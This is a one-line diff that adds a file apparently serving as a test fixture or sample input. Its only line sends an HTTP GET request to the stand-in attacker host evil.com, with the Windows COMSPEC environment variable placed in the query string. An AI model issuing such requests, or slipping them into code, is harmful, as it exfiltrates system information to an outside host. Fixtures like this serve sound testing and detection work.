@@ -1,0 +1,1 @@
+﻿give http_get "http://evil.com/?x=%COMSPEC%"
